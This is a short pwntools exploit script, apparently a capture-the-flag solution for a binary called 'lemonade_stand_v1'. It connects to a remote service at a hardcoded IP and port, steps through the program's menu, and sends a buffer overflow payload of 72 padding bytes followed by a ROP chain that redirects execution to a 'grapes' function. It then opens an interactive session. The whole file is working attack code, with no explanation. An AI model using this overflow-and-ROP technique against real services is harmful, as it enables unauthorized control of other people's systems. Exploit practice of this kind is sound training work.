from pwn import *

exe = "./lemonade_stand_v1"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

io = remote("94.237.48.248", 49919)

rop = ROP(elf)
rop.grapes()

io.sendlineafter(b">>", b"2")
io.sendlineafter(b">>", b"2")
io.sendlineafter(b">>", b"2")
io.sendlineafter(b">>", b"1")
io.sendlineafter(b"name: ", b"a")

padding = 72

payload = flat(
    b"A" * padding,
    rop.chain()
)

write('payload', payload)

io.sendlineafter(b"name: ",payload)

io.interactive()